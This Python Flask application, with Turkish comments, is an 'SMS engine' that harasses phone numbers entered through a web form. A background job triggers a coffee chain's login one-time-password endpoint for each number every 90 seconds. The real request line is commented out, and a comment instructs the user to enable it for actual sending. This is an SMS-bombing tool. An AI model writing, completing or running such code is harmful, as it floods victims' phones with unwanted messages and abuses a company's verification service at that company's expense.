import os
import time
import requests
from flask import Flask, render_template, request, jsonify
from flask_apscheduler import APScheduler

app = Flask(__name__)
scheduler = APScheduler()

# Yapılandırma
class Config:
    SCHEDULER_API_ENABLED = True

app.config.from_object(Config())

# Aktif numaraları tutan sözlük: {telefon: eklenme_zamanı}
active_targets = {}

def send_kahve_dunyasi_sms(phone_number):
    """Gerçek API isteğini gerçekleştiren fonksiyon"""
    # Not: API endpointleri zamanla değişebilir, güncelliğini kontrol edin.
    url = "https://api.kahvedunyasi.com/v1/login/otp"
    
    payload = {
        "mobile_number": phone_number,
        "channel": "sms"
    }
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    try:
        # Gerçek gönderim için requests satırını aktif edin:
        # response = requests.post(url, json=payload, headers=headers, timeout=10)
        # print(f"[{time.ctime()}] Durum: {response.status_code} - Numara: {phone_number}")
        
        # Test amaçlı log:
        print(f"[{time.ctime()}] SMS tetiklendi: {phone_number}")
    except Exception as e:
        print(f"Hata oluştu: {e}")

# Arka plan görevi: Her 90 saniyede bir listedeki tüm numaralara SMS atar
@scheduler.task('interval', id='sms_job', seconds=90)
def scheduled_sms_job():
    if active_targets:
        print(f"--- Periyodik gönderim başlatıldı: {len(active_targets)} numara ---")
        for phone_number in list(active_targets.keys()):
            send_kahve_dunyasi_sms(phone_number)

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>SMS Motoru v2</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; padding-top: 50px; background: #2c1a12; color: #fff; }
            .card { background: #3d2b1f; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 350px; text-align: center; }
            h3 { margin-top: 0; color: #d4a373; }
            input { width: 100%; padding: 12px; margin: 15px 0; border: none; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
            button { width: 100%; padding: 12px; background: #d4a373; color: #2c1a12; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
            button:hover { background: #faedcd; }
            #msg { margin-top: 15px; font-size: 14px; color: #ccd5ae; }
            .status-list { text-align: left; font-size: 12px; margin-top: 20px; border-top: 1px solid #555; padding-top: 10px; }
        </style>
    </head>
    <body>
        <div class="card">
            <h3>☕ SMS Motoru</h3>
            <p>Numarayı başında 0 olmadan girin.</p>
            <input type="text" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
            <button onclick="start()">Sistemi Başlat</button>
            <p id="msg"></p>
            <div class="status-list" id="active-list"></div>
        </div>
        <script>
            function start() {
                const p = document.getElementById('phone').value;
                if(p.length < 10) { alert("Geçerli bir numara girin!"); return; }
                
                fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: p})
                }).then(r => r.json()).then(d => {
                    document.getElementById('msg').innerText = d.message;
                    updateList(p);
                });
            }
            function updateList(p) {
                const list = document.getElementById('active-list');
                list.innerHTML += "<div>• " + p + " eklendi (90sn aralıkla)</div>";
            }
        </script>
    </body>
    </html>
    """

@app.route('/start', methods=['POST'])
def start():
    data = request.json
    phone = data.get('phone')
    if phone:
        # Numarayı aktif listeye ekle
        active_targets[phone] = time.time()
        # İlk SMS'i hemen gönder
        send_kahve_dunyasi_sms(phone)
        return jsonify({"status": "success", "message": f"{phone} için motor başlatıldı!"})
    return jsonify({"status": "error", "message": "Numara eksik!"}), 400

if __name__ == '__main__':
    scheduler.init_app(app)
    scheduler.start()
    # Debug=False kullanımı scheduler'ın iki kez çalışmasını engeller
    app.run(host='0.0.0.0', port=5000, debug=False)
